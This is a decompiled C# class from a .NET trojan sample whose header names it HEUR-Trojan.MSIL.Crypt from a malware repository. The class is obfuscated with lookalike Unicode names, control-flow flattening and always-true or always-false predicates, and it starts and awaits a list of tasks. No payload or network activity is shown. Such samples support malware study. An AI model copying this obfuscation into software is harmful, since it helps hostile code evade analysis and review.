// Decompiled with JetBrains decompiler
// Type: @Ԩ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

internal sealed class \u0040Ԩ
{
  internal List<\u0040ԭ> \u0040ӓ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040Ԩ(\u0040ԭ[] _param1 = null)
  {
    int num = 2;
    if (!\u0040Ԩ.\u0040Ә())
      goto label_5;
label_1:
    \u0040Ԩ.\u0040ӕ();
    if (!\u0040Ԩ.\u0040Ә())
    {
      if (true)
      {
        num = 7;
        goto label_5;
      }
    }
    else if (true)
    {
      num = 3;
      goto label_5;
    }
    else
      goto label_8;
label_3:
    \u0040ԝ.\u0040ݨ(_param1, this);
    num = 8;
label_5:
    bool flag;
    switch (num)
    {
      case 0:
        break;
      case 1:
      case 7:
        goto label_11;
      case 2:
        goto label_1;
      case 5:
        flag = _param1 != null;
        goto label_9;
      case 6:
        goto label_3;
      case 8:
        return;
      default:
        goto label_9;
    }
label_8:
    \u0040Ԩ.\u0040Ӗ((object) this);
    if (\u0040Ԩ.\u0040ӗ())
    {
      num = 5;
      goto label_5;
    }
label_9:
    if (!flag)
      return;
    if (true)
    {
      num = 6;
      goto label_5;
    }
label_11:
    this.\u0040ӓ = new List<\u0040ԭ>();
    num = 0;
    goto label_5;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public void \u0040Ӕ()
  {
    foreach (\u0040ԭ ԭ in this.\u0040ӓ)
    {
      int num = 6;
      bool flag;
      while (true)
      {
        switch (num)
        {
          case 0:
            if (!flag)
            {
              \u0040Ԩ.\u0040ә((object) ԭ.\u0040ӕ());
              goto case 1;
            }
            else
            {
              num = 2;
              continue;
            }
          case 1:
          case 4:
            \u0040Ԩ.\u0040Ӛ((object) ԭ.\u0040ӕ());
            num = 7;
            continue;
          case 2:
            \u0040Ԩ.\u0040ә((object) ԭ.\u0040ӕ());
            goto default;
          case 3:
          case 5:
          case 7:
            goto label_13;
          case 6:
            flag = ԭ.\u0040Ӗ();
            if (\u0040Ԩ.\u0040ӗ())
            {
              num = 0;
              continue;
            }
            goto case 2;
          default:
            if (!\u0040Ԩ.\u0040ӗ())
            {
              num = 1;
              continue;
            }
            if (!\u0040Ԩ.\u0040Ә())
            {
              num = 5;
              continue;
            }
            goto case 0;
        }
      }
label_13:;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӗ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ә() => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ә(object _param0) => ((Task) _param0).Start();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӛ(object _param0) => ((Task) _param0).Wait();
}
